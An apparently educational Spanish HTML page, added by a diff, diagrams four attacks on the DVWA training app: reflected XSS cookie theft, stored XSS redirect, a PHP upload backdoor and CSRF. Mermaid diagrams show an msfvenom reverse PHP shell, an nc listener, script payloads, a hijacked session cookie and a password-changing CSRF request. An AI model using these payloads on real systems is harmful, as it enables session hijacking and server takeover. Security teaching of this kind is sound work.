@@ -1,0 +1,156 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Diagramas — Vulnerabilidades DVWA</title>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+<style>
+  body { font-family: Arial, sans-serif; background: #f4f4f4; padding: 30px; }
+  h1 { text-align: center; color: #222; }
+  .vuln { background: white; border-radius: 12px; padding: 30px; margin: 30px 0;
+          box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+  h2 { color: #c0392b; border-bottom: 2px solid #c0392b; padding-bottom: 8px; }
+  .desc { color: #555; margin-bottom: 20px; font-size: 14px; }
+  .mermaid { text-align: center; }
+  .tip { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px 15px;
+         margin-top: 15px; border-radius: 4px; font-size: 13px; }
+</style>
+</head>
+<body>
+<h1>Vulnerabilidades DVWA — Diagramas de Ataque</h1>
+<p style="text-align:center;color:#777">Informe #1 — Gestión de Vulnerabilidades en Aplicaciones</p>
+
+<!-- VULN 1 -->
+<div class="vuln">
+<h2>Vulnerabilidad 1 — XSS Reflejado</h2>
+<p class="desc">El servidor devuelve el script del atacante sin sanitizar. El navegador de la víctima lo ejecuta y envía su cookie al atacante.</p>
+<div class="mermaid">
+sequenceDiagram
+    actor A as 👤 Atacante (Kali)
+    actor V as 👤 Víctima
+    participant S as 🖥️ Servidor DVWA
+
+    Note over A: Abre listener<br/>python3 -m http.server 8888
+
+    A->>V: Envía enlace malicioso<br/>xss_r/?name=&lt;script&gt;...cookie...&lt;/script&gt;
+
+    V->>S: Víctima hace clic<br/>GET /?name=&lt;script&gt;new Image()...
+
+    Note over S: ❌ NO sanitiza el input<br/>Refleja el script en HTML
+
+    S->>V: HTML con script incrustado<br/>&lt;h2&gt;Hello &lt;script&gt;...&lt;/script&gt;&lt;/h2&gt;
+
+    Note over V: Navegador ejecuta JS<br/>como código legítimo del sitio
+
+    V->>A: GET /?c=PHPSESSID=18ff22346f0f579ba5604b1bc150c45f
+
+    Note over A: ✅ Cookie recibida en consola
+
+    Note over A: Inyecta cookie en F12<br/>document.cookie = "PHPSESSID=..."
+
+    A->>S: Accede como la víctima<br/>sin contraseña
+</div>
+<div class="tip">🔑 <b>Clave:</b> el servidor refleja el input sin codificarlo. El navegador no distingue entre código del sitio y código inyectado.</div>
+</div>
+
+<!-- VULN 2 -->
+<div class="vuln">
+<h2>Vulnerabilidad 2 — XSS Almacenado</h2>
+<p class="desc">El payload se guarda en la base de datos y se ejecuta para TODOS los usuarios que visitan la página.</p>
+<div class="mermaid">
+sequenceDiagram
+    actor A as 👤 Atacante
+    participant S as 🖥️ Servidor DVWA
+    participant DB as 🗄️ Base de Datos
+    actor V1 as 👤 Víctima 1
+    actor V2 as 👤 Víctima 2
+
+    Note over A: F12 → cambia maxlength<br/>de 50 a 100 en el HTML
+
+    A->>S: POST con payload en campo Message<br/>&lt;script&gt;window.location.href="https://google.com"&lt;/script&gt;
+
+    S->>DB: ❌ Guarda script sin sanitizar<br/>INSERT INTO guestbook...
+
+    Note over DB: ☠️ Script almacenado<br/>permanentemente
+
+    V1->>S: Visita la página de XSS Stored
+    S->>DB: SELECT comment FROM guestbook
+    DB->>S: Devuelve el script malicioso
+    S->>V1: HTML con script incluido
+    Note over V1: 🔴 Redirigido a google.com<br/>automáticamente
+
+    V2->>S: Visita la página (otro día)
+    S->>V2: Mismo HTML con script
+    Note over V2: 🔴 También redirigido<br/>sin hacer nada
+
+    Note over A: Para restaurar:<br/>UPDATE guestbook SET comment = REPLACE(...)
+</div>
+<div class="tip">🔑 <b>Clave:</b> a diferencia del Reflejado, aquí la víctima no necesita hacer clic en ningún enlace malicioso. Solo visitar la página es suficiente.</div>
+</div>
+
+<!-- VULN 3 -->
+<div class="vuln">
+<h2>Vulnerabilidad 3 — Upload Backdoor</h2>
+<p class="desc">El servidor acepta cualquier archivo sin verificar si es imagen. Un PHP malicioso se ejecuta y abre una conexión inversa al atacante.</p>
+<div class="mermaid">
+sequenceDiagram
+    actor A as 👤 Atacante (Kali)
+    participant S as 🖥️ Servidor DVWA
+    participant FS as 📁 /uploads/
+
+    Note over A: 1. Genera payload PHP<br/>msfvenom -p php/reverse_php<br/>LHOST=127.0.0.1 LPORT=4444
+
+    Note over A: 2. Abre listener Netcat<br/>nc -lvnp 4444 ← espera conexión
+
+    A->>S: 3. Sube danielaguirre.php<br/>via formulario DVWA
+
+    Note over S: ❌ NO valida extensión<br/>ni contenido del archivo
+
+    S->>FS: 4. Guarda PHP en<br/>/dvwa/hackable/uploads/
+
+    A->>S: 5. Accede a la URL<br/>GET /uploads/danielaguirre.php
+
+    Note over S: 6. Apache ejecuta el PHP<br/>(mod_php activo)
+
+    S->>A: 7. Conexión TCP inversa<br/>bash → 127.0.0.1:4444
+
+    Note over A: ✅ Shell obtenida<br/>www-data@dvwa:~$<br/>Control total del servidor
+</div>
+<div class="tip">🔑 <b>Clave:</b> Apache ejecuta cualquier .php accesible por URL. DVWA no verifica que el archivo sea una imagen. El nc debe estar abierto ANTES de acceder a la URL.</div>
+</div>
+
+<!-- VULN 4 -->
+<div class="vuln">
+<h2>Vulnerabilidad 4 — CSRF</h2>
+<p class="desc">El navegador envía cookies automáticamente. El atacante crea una página externa que hace peticiones al servidor en nombre de la víctima autenticada.</p>
+<div class="mermaid">
+sequenceDiagram
+    actor A as 👤 Atacante
+    actor V as 👤 Víctima (autenticada)
+    participant MS as 🌐 Sitio Malicioso
+    participant DS as 🖥️ Servidor DVWA
+
+    Note over V: Sesión activa en DVWA<br/>Cookie: PHPSESSID=abc123
+
+    A->>MS: 1. Crea página con enlace oculto<br/>img src="http://dvwa/csrf/?password_new=hacked"
+
+    A->>V: 2. Envía link del sitio malicioso<br/>"Mira esta página interesante"
+
+    V->>MS: 3. Víctima abre la página
+
+    Note over MS: 4. Página carga imagen invisible<br/>que apunta a DVWA
+
+    MS->>DS: 5. Petición automática del navegador<br/>GET /csrf/?password_new=hacked&Change=Change<br/>🍪 Cookie PHPSESSID=abc123 incluida automáticamente
+
+    Note over DS: ❌ NO verifica origen<br/>NO tiene token CSRF<br/>Cree que es la víctima
+
+    DS->>DS: 6. Cambia contraseña<br/>a "hacked"
+
+    Note over V: 😱 Contraseña cambiada<br/>sin saberlo<br/>sin hacer nada
+</div>
+<div class="tip">🔑 <b>Clave:</b> el navegador adjunta cookies automáticamente a CUALQUIER petición hacia el dominio. El servidor no puede distinguir si la petición fue intencional o forjada por un sitio externo.</div>
+</div>
+
+<script>mermaid.initialize({startOnLoad:true, theme:'default'});</script>
+</body>
+</html>
